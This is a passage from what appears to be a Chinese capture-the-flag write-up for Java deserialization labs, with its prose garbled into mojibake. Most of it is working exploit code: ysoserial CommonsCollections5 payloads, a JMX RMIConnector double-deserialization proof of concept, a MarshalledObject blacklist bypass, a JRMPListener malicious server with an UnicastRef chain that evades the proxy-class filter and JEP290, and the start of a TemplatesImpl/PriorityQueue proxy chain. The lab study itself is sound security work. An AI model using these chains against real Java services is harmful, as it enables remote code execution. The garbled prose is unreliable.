·çš„base64æŠ¥é”™ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“åŸå› ï¼Œæ‰€ä»¥æˆ‘ä»¬åŠ ä¸Šæˆ‘ä»¬çš„base64çš„payloadåå°±å¯ä»¥è¿›è¡ŒäºŒæ¬¡ååºåˆ—åŒ–äº† å…ˆåˆ©ç”¨ysoå·¥å…·ç”Ÿæˆä¸€ä¸ªpayload java -jar ysoserial-all.jar CommonsCollections5 calc sherlock.txt ç„¶åæˆ‘ä»¬å†æ¬¡ä¿®æ”¹getBind()å‡½æ•° public static Object getBind() throws Exception byte[] fileContent = Files.readAllBytes(Paths.get(E:\\\\safety\\\\ysoserial-master\\\\sherlock.txt)); String payload = Base64.getEncoder().encodeToString(fileContent); JMXServiceURL jmxServiceURL = new JMXServiceURL(service:jmx:rmi://www.baidu.com/stub/+payload); RMIConnector connector = new RMIConnector(jmxServiceURL, new HashMap()); //connector.connect(); InvokerTransformer invokerTransformer = new InvokerTransformer(connect,null,null); HashMapObject, Object map = new HashMap(); LazyMap lazyMap = (LazyMap) LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, connector); HashMapObject, Object map2 = new HashMap(); map2.put(tiedMapEntry, bbb); Class? c = LazyMap.class; Field factoryField = c.getDeclaredField(factory); factoryField.setAccessible(true); factoryField.set(lazyMap, invokerTransformer); lazyMap.remove(connector); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream); outputStream.writeObject(map2); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); return null; æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ é‡æ–°ç”Ÿæˆpaylaod java -jar ysoserial-all.jar CommonsCollections5 touch /tmp/666 sherlock.txt poc: package org.example;import com.yxxx.javasec.deserialize.Utils;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.remote.JMXServiceURL;import javax.management.remote.rmi.RMIConnector;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;public class Test public static void main(String[] args) throws Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream); outputStream.writeUTF(SJTU); outputStream.writeInt(1896); outputStream.writeObject(getBind()); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readUTF(); objectInputStream.readInt(); objectInputStream.readObject(); System.out.println(Utils.bytesTohexString(byteArrayOutputStream.toByteArray())); public static Object getBind() throws Exception byte[] fileContent = Files.readAllBytes(Paths.get(E:\\\\safety\\\\ysoserial-master\\\\sherlock.txt)); String payload = Base64.getEncoder().encodeToString(fileContent); JMXServiceURL jmxServiceURL = new JMXServiceURL(service:jmx:rmi://www.baidu.com/stub/+payload); RMIConnector connector = new RMIConnector(jmxServiceURL, new HashMap()); //connector.connect(); InvokerTransformer invokerTransformer = new InvokerTransformer(connect,null,null); HashMapObject, Object map = new HashMap(); LazyMap lazyMap = (LazyMap) LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, connector); HashMapObject, Object map2 = new HashMap(); map2.put(tiedMapEntry, bbb); Class? c = LazyMap.class; Field factoryField = c.getDeclaredField(factory); factoryField.setAccessible(true); factoryField.set(lazyMap, invokerTransformer); lazyMap.remove(connector); return map2; è™½ç„¶é¡µé¢ä¼šæŠ¥é”™ä½†æŸ¥çœ‹ç›¸å…³ç›®å½•ä¸‹é¢è¿˜æ˜¯æˆåŠŸå†™è¿›äº†æ–‡ä»¶666 Lab5ä¸€å¼€å§‹æˆ‘ä»¬ä¸€æ ·çœ‹ä»£ç ï¼Œçœ‹çœ‹å’Œlab4ç›¸æ¯”æœ‰ä»€ä¹ˆå˜åŒ– é¦–å…ˆå°±æ˜¯MyObjectInputStreamç±»ä¸­çš„æ”¹å˜ï¼Œå¢åŠ äº†é»‘åå•ï¼Œå¹¶ä¸”åœ¨é™æ€ä»£ç å—ä¸­æ·»åŠ ï¼Œæ‰€ä»¥ä¼šè¢«æœ€å…ˆè¿è¡Œ ç„¶ååé¢åšäº†ä¸€ä¸ªdo-whileå¾ªç¯æ£€æŸ¥ååºåˆ—åŒ–çš„ç±»åæ˜¯å¦åœ¨é»‘åå•ä¸­ï¼Œåœ¨çš„è¯å°±ä¼šæŠ›å‡ºå¼‚å¸¸â€go out!â€ é»‘åå•å®šä¹‰å¦‚ä¸‹ï¼š åƒæ˜¯å‰é¢é‚£äº›Transformerï¼Œéƒ½åœ¨functorsä¸‹ï¼Œæ‰€ä»¥ä¹‹å‰çš„pocå°±ä¸èƒ½ç”¨äº† ä¸ä»…å¦‚æ­¤ï¼Œä¸‹é¢è¿˜åˆå®šä¹‰äº†ä¸€ä¸ªæ–¹æ³•resolveProxyClassï¼Œä¸»è¦ä½œç”¨æ˜¯æ ¹æ®æ¥å£åç§°æ•°ç»„åŠ è½½å¯¹åº”çš„æ¥å£ç±»ï¼Œå¹¶åˆ›å»ºæˆ–è¿”å›ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±» æŸ¥æ‰¾ä¸€ä¸‹å®ƒçš„ç”¨æ³•ï¼Œå‘ç°ä¼šåœ¨ObjectInputStreamä¸‹é¢è¢«è°ƒç”¨ è¿™é“é¢˜éœ€è¦è·Ÿè¿›ä¸€ä¸‹åŸç”Ÿååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œå³readObject()çš„éƒ¨åˆ†ååºåˆ—åŒ–æµç¨‹ å…ˆåˆ›å»ºä¸€ä¸ªæ™®é€šçš„ç±» package org.example;import java.io.ObjectInputStream;import java.io.Serializable;public class UserTest implements Serializable public UserTest() public int age; public String name; private float weight; public UserTest(int age,String name,float weight) this.name = name; this.age = age; this.weight = weight; static System.out.println(static); ç„¶ååˆ›å»ºå¯¹è±¡ï¼Œç”¨åŸç”Ÿåºåˆ—åŒ–ï¼Œç”¨åŸç”Ÿååºåˆ—åŒ– package org.example;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;public class Main public static void main(String[] args) throws Exception UserTest userTest = new UserTest(21,sherlock,65); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream); outputStream.writeUTF(SJTU); outputStream.writeInt(1896); outputStream.writeObject(userTest); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readUTF(); objectInputStream.readInt(); objectInputStream.readObject(); æ–­ç‚¹æ‰“åœ¨readObject()å¤„ï¼Œå¼ºåˆ¶è·Ÿè¿›å» ç»§ç»­è·Ÿè¿›readOject0()ä¸­ gptç»™å‡ºçš„è§£é‡Šæ˜¯ï¼š è¿™æ®µä»£ç æ˜¯Javaååºåˆ—åŒ–è¿‡ç¨‹ä¸­readObject0æ–¹æ³•çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå¤„ç†è¾“å…¥æµä¸­çš„ä¸åŒç±»å‹çš„å¯¹è±¡æ•°æ®ã€‚ä¸‹é¢æ˜¯å¯¹ä»£ç çš„é€æ­¥åˆ†æï¼š è·³è¿‡é‡ç½®æ ‡è®°: byte tc;while ((tc = bin.peekByte()) == TC_RESET) bin.readByte(); handleReset(); è¿™éƒ¨åˆ†ä»£ç é€šè¿‡å¾ªç¯è·³è¿‡æ‰€æœ‰çš„ TC_RESET æ ‡è®°ï¼Œå¹¶è°ƒç”¨ handleReset() æ–¹æ³•æ¥å¤„ç†é‡ç½®æ“ä½œã€‚å¾ªç¯ç»“æŸåï¼Œtc å˜é‡ä¿å­˜äº†ç¬¬ä¸€ä¸ªé TC_RESET çš„å­—èŠ‚ å¢åŠ æ·±åº¦è®¡æ•°: depth++; depth æ˜¯ä¸€ä¸ªè®¡æ•°å™¨ï¼Œç”¨äºè·Ÿè¸ªå½“å‰ååºåˆ—åŒ–è°ƒç”¨çš„æ·±åº¦ã€‚è¿™åœ¨å¤„ç†åµŒå¥—å¯¹è±¡æ—¶å¾ˆæœ‰ç”¨ æ ¹æ®ç±»å‹å¤„ç†ä¸åŒçš„æ•°æ®: switch (tc) // å„ç§ç±»å‹çš„å¤„ç†é€»è¾‘ é€šè¿‡ switch è¯­å¥ï¼Œä»£ç æ ¹æ® tc çš„å€¼æ¥ç¡®å®šæ¥ä¸‹æ¥è¦å¤„ç†çš„å¯¹è±¡ç±»å‹ã€‚ä¸åŒçš„ç±»å‹ä»£ç æœ‰ä¸åŒçš„å¤„ç†é€»è¾‘ï¼š TC_NULL: è°ƒç”¨ readNull() æ–¹æ³•å¤„ç†ç©ºå¼•ç”¨ã€‚ TC_REFERENCE: è°ƒç”¨ readHandle(unshared) æ–¹æ³•å¤„ç†å¯¹è±¡å¼•ç”¨ã€‚ TC_CLASS: è°ƒç”¨ readClass(unshared) æ–¹æ³•å¤„ç†ç±»å¯¹è±¡ã€‚ TC_CLASSDESC å’Œ TC_PROXYCLASSDESC: è°ƒç”¨ readClassDesc(unshared) æ–¹æ³•å¤„ç†ç±»æè¿°ç¬¦ã€‚ TC_STRING å’Œ TC_LONGSTRING: è°ƒç”¨ readString(unshared) å¹¶é€šè¿‡ checkResolve æ–¹æ³•å¤„ç†å­—ç¬¦ä¸²ã€‚ TC_ARRAY: è°ƒç”¨ readArray(unshared) å¹¶é€šè¿‡ checkResolve æ–¹æ³•å¤„ç†æ•°ç»„ã€‚ TC_ENUM: è°ƒç”¨ readEnum(unshared) å¹¶é€šè¿‡ checkResolve æ–¹æ³•å¤„ç†æšä¸¾ã€‚ TC_OBJECT: è°ƒç”¨ readOrdinaryObject(unshared) å¹¶é€šè¿‡ checkResolve æ–¹æ³•å¤„ç†æ™®é€šå¯¹è±¡ã€‚ TC_EXCEPTION: è°ƒç”¨ readFatalException() è¯»å–å¼‚å¸¸ï¼Œå¹¶æŠ›å‡º WriteAbortedExceptionã€‚ TC_BLOCKDATA å’Œ TC_BLOCKDATALONG: å¤„ç†å—æ•°æ®æ¨¡å¼ï¼Œå¦‚æœ oldMode ä¸º trueï¼Œåˆ™è®¾ç½®å—æ•°æ®æ¨¡å¼å¹¶æŠ›å‡º OptionalDataExceptionï¼›å¦åˆ™æŠ›å‡º StreamCorruptedExceptionã€‚ TC_ENDBLOCKDATA: å¦‚æœ oldMode ä¸º trueï¼ŒæŠ›å‡º OptionalDataExceptionï¼›å¦åˆ™æŠ›å‡º StreamCorruptedExceptionã€‚ é»˜è®¤æƒ…å†µ: default: throw new StreamCorruptedException( String.format(invalid type code: %02X, tc)); å¦‚æœ tc çš„å€¼ä¸åœ¨é¢„æœŸçš„ç±»å‹ç èŒƒå›´å†…ï¼Œåˆ™æŠ›å‡º StreamCorruptedExceptionï¼ŒæŒ‡ç¤ºæµä¸­å­˜åœ¨æ— æ•ˆçš„ç±»å‹ç  è¿™æ®µä»£ç é€šè¿‡ç±»å‹ç æ§åˆ¶æµçš„æ‰§è¡Œè·¯å¾„ï¼Œç¡®ä¿æ ¹æ®åºåˆ—åŒ–åè®®æ­£ç¡®åœ°ååºåˆ—åŒ–ä¸åŒç±»å‹çš„æ•°æ® è¨€å½’æ­£ä¼ ï¼Œæˆ‘ä»¬ç»§ç»­å¾€ä¸‹èµ°ï¼Œç”±äºæˆ‘ä»¬ååºåˆ—åŒ–çš„userTestæ˜¯ä¸€ä¸ªæ™®é€šçš„javaå¯¹è±¡ï¼Œæ‰€ä»¥ä¼šèµ°è¿›TC_OBJECTé‡Œ è·Ÿè¿›readOrdinaryObject() å½“æ‰§è¡Œå®Œä¸‹é¢è¿™ä¸€è¡Œä¹‹åï¼Œæˆ‘ä»¬ååºåˆ—åŒ–è¿‡ç¨‹æ‰€éœ€è¦çš„å„ç§å¯¹è±¡çš„æ‰€æœ‰ä¿¡æ¯å°±å·²ç»å­˜å‚¨äºå…¶ä¸­äº† æˆ‘ä»¬è·Ÿè¿›readClassDescæ–¹æ³• tcç»§ç»­è¯»å–ä¸‹ä¸€ä¸ªå­—èŠ‚ï¼ŒTC_CLASSDESCè¡¨ç¤ºæ¥ä¸‹æ¥è¦ååºåˆ—åŒ–çš„æ˜¯ä¸€ä¸ªClass è·Ÿè¿›readNonProxyDesc() è¿™é‡Œå°è¯•è¯»å–ç±»æ ‡è¯†ç¬¦ï¼Œè·Ÿè¿›readClassDescriptor() è·Ÿè¿›readNonProxyæ–¹æ³• è¯¥æ–¹æ³•ä¸»è¦å°±æ˜¯å¯¹ååºåˆ—åŒ–ç±»çš„å±æ€§è¿›è¡Œä¸€ä¸ªè¯»å– æ¥ç€ä¸€è·¯è¿”å›ï¼Œå›åˆ°readNonProxyDesc()ï¼Œæ­¤æ—¶readDescå·²ç»å­˜æ”¾è¿›æˆ‘ä»¬ååºåˆ—åŒ–çš„UserTestç±»çš„ç›¸å…³ä¿¡æ¯äº† æ¥ç€æˆ‘ä»¬ç»§ç»­å¾€ä¸‹èµ°ï¼Œæ¥åˆ°è¿™é‡Œçš„resolveClass() é¢˜ç›®ä¸­çš„MyObjectInputStreamé‡Œé¢çš„resolveClass()å°±æ˜¯åœ¨è¿™ä¸ªåœ°æ–¹åšäº†ä¸ªé»‘åå•è¿‡æ»¤çš„ï¼Œå¦‚æœä½¿ç”¨MyObjectInputStreamæ¥è¿›è¡Œååºåˆ—åŒ–çš„è¯ï¼Œæ­¤å¤„ä¼šèµ°å…¥æˆ‘ä»¬è‡ªå®šä¹‰çš„resolveClassä¸­ èµ°è¿›resolveClasså‡½æ•°ï¼Œç›´æ¥è¿›è¡Œäº†forNameå‡½æ•°çš„ç±»åŠ è½½ è¿”å›åclå·²ç»æ˜¯UserTestçš„Classäº† æ¥ç€ä¸€è·¯è¿”å›åˆ°readOrdinaryObject()ï¼Œdescå·²å‡†å¤‡å°±ç»ª é€šè¿‡forClasså‡½æ•°ç±»åŠ è½½èµ‹å€¼ç»™cl æ¥ç€å®ä¾‹åŒ–desc å¾—åˆ°ä¸€ä¸ªç©ºç©ºå¦‚ä¹Ÿçš„UserTestå¯¹è±¡ å¾€ä¸‹èµ°ï¼Œé¡¾åæ€ä¹‰æ˜¯è¦è¯»å–åºåˆ—åŒ–æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¦ç»™objè¿™ä¸ªå¯¹è±¡çš„å±æ€§èµ‹å€¼ è·Ÿè¿›çœ‹çœ‹ æ¥åˆ°è¿™ï¼Œè¿™é‡Œæœ‰ä¸ªhasReadObjectMethodçš„åˆ¤æ–­ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯åˆ¤æ–­å½“å‰ç±»ä¸­æœ‰æ²¡æœ‰é‡å†™readObject()ï¼Œæˆ‘ä»¬çš„TestUseræ˜¯æ²¡æœ‰çš„ï¼Œå› æ­¤ç›´æ¥è·³è¿‡èµ°åˆ°defaultReadFields(obj, slotDesc); æˆ‘ä»¬è·Ÿè¿›è¯¥æ–¹æ³•ï¼Œå¾€ä¸‹èµ° åœ¨è¿™é‡Œå¯¹åŸºç¡€ç±»å‹ï¼ˆintï¼Œfloadï¼Œbooleanç­‰ï¼‰è¿›è¡Œäº†èµ‹å€¼ æ­¥è¿‡äº†ä¹‹åæˆ‘ä»¬æŸ¥çœ‹å¯çŸ¥objçš„ageå’Œweightå­—æ®µéƒ½å·²ç»è¿›è¡Œäº†èµ‹å€¼ ç»§ç»­å¾€ä¸‹èµ°ï¼Œè·Ÿè¿›setObjFieldValues() ä»å‚æ•°ä¸­æˆ‘ä»¬å°±çŸ¥é“æ˜¯å¯¹ä¹‹å‰è¿˜æ²¡æœ‰èµ‹å€¼çš„å­—æ®µè¿›è¡Œä¸€ä¸ªèµ‹å€¼ æ­¥è¿‡ä¹‹åï¼Œè‡³æ­¤æ‰€æœ‰étraiseintå­—æ®µéƒ½èµ‹å€¼äº† ä¸€è·¯æ­¥è¿‡å›åˆ°readOrdinaryObject()æ–¹æ³• ç´§æ¥ç€ä¸‹é¢å°±æŒ¨ç€hasReadResolveMethodçš„åˆ¤æ–­ï¼Œå¦‚æœä¸ºtrueçš„è¯ï¼Œé‚£ä¹ˆå°±ä¼šæ‰§è¡Œå¯¹åº”ååºåˆ—åŒ–çš„ç±»ä¸­çš„readResolveæ–¹æ³• readResolveæ–¹æ³•å¾ˆçœ¼ç†Ÿå§ï¼Œè®¤çœŸçœ‹è¿‡é¢˜ç›®æä¾›çš„ä»£ç çš„è¯ï¼Œå°±çŸ¥é“åœ¨MarshalledObjectä¸­ï¼Œæœ‰å®šä¹‰readResolve()æ–¹æ³•ï¼Œæ‰€ä»¥å¦‚æœå¯¹MarshalledObjectè¿›è¡Œååºåˆ—åŒ–ï¼Œé‚£ä¹ˆæ˜¯ä¼šèµ°åˆ°ifé‡Œé¢çš„ çœ‹çœ‹MarshalledObjectä¸­çš„readResolve() èŠœæ¹–ï¼Œé‡Œé¢åˆæ˜¯ä¸€ä¸ªåŸç”Ÿååºåˆ—åŒ–ï¼Œæ˜¯å¯¹MarshalledObjectçš„å‚æ•°bytesè¿›è¡Œä¸€ä¸ªååºåˆ—åŒ– å¹¶ä¸”MarshalledObjectå¹¶æ²¡æœ‰åœ¨é»‘åå•ä¸­ï¼Œæ‰€ä»¥å¦‚æœæ„é€ æ¶æ„çš„MarshalledObject.byte[]ï¼Œé‚£ä¹ˆå¯¹è¿™ä¸ªMarshalledObjectå¯¹è±¡è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šç›´æ¥å†èµ°ä¸€æ¬¡ä¸å—é»‘åå•é™åˆ¶çš„åŸç”Ÿååºåˆ—åŒ–ï¼Œé€šè¿‡äºŒæ¬¡ååºåˆ—åŒ–å†æ¬¡è¾¾åˆ°æ”»å‡» æ€è·¯å·²ç»æœ‰äº†ï¼Œç°åœ¨æˆ‘ä»¬ç”¨ysoå·¥å…·ç»™æˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªpayload: java -jar ysoserial-all.jar CommonsCollections5 touch /tmp/666 sherlock.txt pocï¼š package org.example;import com.yxxx.javasec.deserialize.MarshalledObject;import com.yxxx.javasec.deserialize.Utils;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class Main public static void main(String[] args) throws Exception MarshalledObject marshalledObject = new MarshalledObject(); byte[] fileContent = Files.readAllBytes(Paths.get(E:\\\\safety\\\\ysoserial-master\\\\sherlock.txt)); Class? marshalledClass = MarshalledObject.class; Field field = marshalledClass.getDeclaredField(bytes); field.setAccessible(true); field.set(marshalledObject, fileContent); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream); outputStream.writeUTF(SJTU); outputStream.writeInt(1896); outputStream.writeObject(marshalledObject); System.out.println(Utils.bytesTohexString(byteArrayOutputStream.toByteArray())); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readUTF(); objectInputStream.readInt(); objectInputStream.readObject(); å°†ç”Ÿæˆçš„hexç¼–ç æ‹¿å»æµ‹è¯•ï¼ŒæˆåŠŸå†™å…¥ Lab6æŸ¥çœ‹è¯¥é¢˜ä»£ç ï¼Œä¸lab5çš„å·®åˆ«åœ¨äºç±»MarshalledObjectä¸å­˜åœ¨ï¼Œå¹¶ä¸”MyObjectInputStreamç±»è¿›è¡Œäº†ä¸€å®šçš„å˜åŒ– resolveClassæ–¹æ³•çš„æ£€éªŒé»‘åå•ä¸­å°‘äº†java.rmi.serverï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é¢˜æˆ‘ä»¬å¯ä»¥ç”¨ä¸Šrmijrmpæ³¨å…¥äº† ä½†æ˜¯å‘¢åœ¨resolveProxyClassæ–¹æ³•é‡Œé¢è¿˜åŠ äº†ä¸€ä¸ªé»‘åå•çš„è¿‡æ»¤ æŸ¥çœ‹ä¸‹è¯¥æ–¹æ³•çš„ç”¨æ³• åœ¨ObjectInputStreamç±»çš„readProxyDescæ–¹æ³•ä¸­ä¼šç”¨åˆ°ï¼Œå†æŸ¥çœ‹readProxyDescçš„ç”¨æ³• åœ¨readClassDescæ–¹æ³•ä¸­ç”¨åˆ°ï¼Œå¹¶ä¸”åœ¨caseä¸ºTC_PROXYCLASSDESCçš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯è¯´å½“å¤„ç†çš„æ˜¯ä»£ç†å¯¹è±¡çš„æ—¶å€™ ç»§ç»­å‘ä¸ŠæŸ¥æ‰¾ï¼Œæ–¹æ³•æœ‰ç‚¹å¤šå°±ä¸çœ‹äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ è¯¥é¢˜çš„jdkç‰ˆæœ¬ä¸º8u222ï¼Œæ‰€ä»¥ä¼šæœ‰JEP90æœºåˆ¶ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œä¸€ä¸ªç»•è¿‡ å…ˆåˆ©ç”¨ysoå¼€ä¸€ä¸ªæ¶æ„æœåŠ¡ç«¯ java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 calc åˆæ­¥Pocå¦‚ä¸‹ï¼š package org.example;import com.yxxx.javasec.deserialize.MyObjectInputStream;import com.yxxx.javasec.deserialize.Utils;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Proxy;import java.rmi.registry.Registry;import java.rmi.server.ObjID;import java.rmi.server.RemoteObjectInvocationHandler;import java.util.Random;public class Main public static void main(String[] args) throws Exception ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(127.0.0.1, 1099); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); Registry proxy = (Registry) Proxy.newProxyInstance(Main.class.getClassLoader(), new Class[] Registry.class , obj); ByteArrayOutputStream bytes = new ByteArrayOutputStream(); ObjectOutputStream out = new ObjectOutputStream(bytes); out.writeUTF(SJTU); out.writeInt(1896); out.writeObject(proxy); System.out.println(Utils.bytesTohexString(bytes.toByteArray())); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes.toByteArray()); ObjectInputStream objectInputStream = new MyObjectInputStream(byteArrayInputStream); objectInputStream.readUTF(); objectInputStream.readInt(); objectInputStream.readObject(); æŠ¥é”™å¦‚ä¸‹ï¼š è°ƒè¯•çœ‹ä¸€æ‰‹ï¼Œèµ°è¿›readObject()ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹ èµ°è¿›äº†é¢˜ç›®è‡ªå®šä¹‰çš„resolveProxyClassæ–¹æ³•é‡Œé¢ å°±æ˜¯æœ€åä¸€æ­¥æˆ‘ä»¬å°†UnicastRefå¯¹è±¡ç»™åŒ…è£…ä¸ºä»£ç†å¯¹è±¡åç»™æŠ¥çš„é”™è¯¯ ï¼ˆå¾ˆå¥‡æ€ªè™½ç„¶æŠ¥é”™äº†ï¼Œä½†æ˜¯è®¡ç®—å™¨è¿˜æ˜¯å¼¹äº†å‡ºæ¥ï¼‰ çœ‹ä¸€ä¸‹è¦æ€ä¹ˆé¿å…è¿™ç§æƒ…å†µ ç½‘ç»œä¸Šä¸€ç¯‡æ–‡ç« å¦‚ä¸‹å†™é“ï¼š æ–‡ä¸­æåˆ°äº†UnicaseRefå¯¹è±¡ä¸ç”¨å°è£…æˆRemoteç±»å‹ä¾¿å¯ä»¥ç›´æ¥æ‹¿æ¥ç”¨ èŠœæ¹–ï¼Œæ”¹ä¸€æ‰‹ package org.example;import com.yxxx.javasec.deserialize.MyObjectInputStream;import com.yxxx.javasec.deserialize.Utils;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.rmi.server.ObjID;import java.util.Random;public class Main public static void main(String[] args) throws Exception ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(127.0.0.1, 1099); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); ByteArrayOutputStream bytes = new ByteArrayOutputStream(); ObjectOutputStream out = new ObjectOutputStream(bytes); out.writeUTF(SJTU); out.writeInt(1896); out.writeObject(ref); System.out.println(Utils.bytesTohexString(bytes.toByteArray())); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes.toByteArray()); ObjectInputStream objectInputStream = new MyObjectInputStream(byteArrayInputStream); objectInputStream.readUTF(); objectInputStream.readInt(); objectInputStream.readObject(); æœ¬åœ°æµ‹è¯•æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼Œæ‹¿ç€æ‰“å°å‡ºæ¥çš„hexå­—ç¬¦ä¸²å»æµ‹è¯•ä¸€ä¸‹ï¼Œä¹ŸæˆåŠŸå¼¹å‡º å‰©ä¸‹å°±æ˜¯åªè¦æŠŠæ¶æ„æœåŠ¡ç«¯é‚£è¾¹çš„å‘½ä»¤æ¢ä¸€ä¸‹å°±å¯ä»¥äº† Lab7å‚è€ƒæ–‡ç« ï¼šhttps://blog.hackpax.top/JavaDeserializeLabs/#0x07-Lab7 Lab9é¢˜ç›®ç»™äº†ä¸ªMyInvocationHandlerï¼Œä¸»è¦å†…å®¹å°±æ˜¯åå°„è°ƒç”¨typeå‚æ•°çš„æ‰€æœ‰æ–¹æ³• ä¸€ä¸‹å­å°±æƒ³åˆ°äº†å¯ä»¥åˆ©ç”¨TemplatesImplé‡Œé¢çš„newTransformer()æ–¹æ³•ï¼Œæ¥å®ç°ä»»æ„ç±»åŠ è½½ ç„¶ååˆæ˜¯åœ¨invocationhandleré‡Œé¢çš„ï¼Œé‚£è‚¯å®šå°±æ˜¯è¦åˆ©ç”¨åŠ¨æ€ä»£ç†æ¥è§£å†³é¢˜ç›® åŠ¨æ€ä»£ç†çš„å·¥ä½œåŸç†å¤§å®¶è‚¯å®šéƒ½æ¸…æ¥šï¼Œåœ¨è¿™é‡Œçš„è¯éœ€è¦è°ƒç”¨ä»»æ„çš„æœ‰å‚æ–¹æ³•ï¼Œä¸ç„¶çš„è¯xmethod.invoke(args[0]);ä¼šæŠ¥é”™ åœ¨ccé“¾ä¸­æœ‰åˆ©ç”¨åˆ°åŠ¨æ€ä»£ç†å’ŒnewTransformer()æ–¹æ³•çš„æ˜¯cc2è¿™æ¡é“¾ å¯æƒœé¢˜ç›®ä¾èµ–é‡Œé¢æ²¡æœ‰ccäº† ä½†æ˜¯æ— å¦¨ï¼ŒPriorityQueueç±»è¿˜æ˜¯å¯ä»¥ç”¨çš„ï¼Œå¹¶ä¸”PriorityQueueçš„shiftDownUsingComparator()æ–¹æ³•ä¸­å­˜åœ¨ä¸€ä¸ªcompare()æ–¹æ³•çš„è°ƒç”¨ comparatorå¦‚æœä¸ºä»£ç†å¯¹è±¡ï¼Œæ ¹æ®å‰é¢çš„åŠ¨æ€ä»£ç†çš„çŸ¥è¯†ï¼Œå¯¹åº”çš„invocationHandlerä¸­çš„invoke()æ–¹æ³•å°±ä¼šè¢«è°ƒç”¨ï¼Œå› æ­¤è¿™é‡Œçš„comparatoréœ€è¦æ˜¯ä¸€ä¸ªinvocationHandlerä¸ºMyInvocationHandlerå¯¹è±¡çš„åŠ¨æ€ä»£ç† å½“è°ƒç”¨åˆ°compare()æ–¹æ³•åï¼Œå°±ä¼šè§¦å‘invoke()ï¼Œcompare()çš„å‚æ•°ï¼Œå³queueæ•°ç»„ä¸­çš„å…ƒç´ ä¼šä¼ å…¥invoke()çš„args å› æ­¤pocå¦‚ä¸‹ï¼š package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.yxxx.javasec.deserialize.MyInvocationHandler;import com.yxxx.javasec.deserialize.Utils;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Comparator;import java.util.PriorityQueue;public class Main public static void main(String[] args) throws Exception TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(_name); nameField.setAccessible(true); nameField.set(templates, aaa); Field bytecodesField = tc.getDeclaredField(_bytecodes); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); byte[][] codes = code; bytecodesField.set(templates, codes); Field 